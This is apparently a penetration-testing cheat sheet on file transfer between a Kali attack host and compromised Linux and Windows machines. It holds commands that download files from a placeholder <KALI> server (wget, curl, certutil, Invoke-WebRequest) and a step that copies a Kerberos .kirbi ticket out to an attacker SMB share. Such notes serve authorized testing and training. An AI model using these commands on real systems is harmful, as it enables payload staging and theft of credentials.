# File transfer

## Serve from Kali
```bash
python3 -m http.server 8000
impacket-smbserver share /path/to/files -smb2support
```
- Check received size/checksum before executing.

## Pull to Linux
```bash
wget http://<KALI>:8000/file -O /tmp/file
curl http://<KALI>:8000/file -o /tmp/file
```
- `/dev/tcp` HTTP download includes response headers: strip them, then checksum.

## Pull to Windows
```powershell
certutil -urlcache -split -f http://<KALI>:8000/file.exe file.exe
Invoke-WebRequest http://<KALI>:8000/file.exe -OutFile file.exe
```

## Authenticated SMB share
When Windows refuses guest access to the share.

```bash
sudo impacket-smbserver share . -smb2support -username <USER> -password '<PW>'
```
```cmd
net view \\<KALI>
net use \\<KALI>\share /user:<USER> <PW>
copy C:\Temp\file.bin \\<KALI>\share\file.bin
```
- `<USER>`/`<PW>` here = any creds you pick for the Kali share.

## PowerShell paths containing brackets
```powershell
Copy-Item -LiteralPath 'C:\Temp\[ticket-id]-user@service.kirbi' `
  -Destination '\\<KALI>\share\ticket.kirbi' -ErrorAction Stop
Test-Path -LiteralPath '\\<KALI>\share\ticket.kirbi'
```
- Without `-LiteralPath`, `[` `]` are wildcard characters and the path won't match.
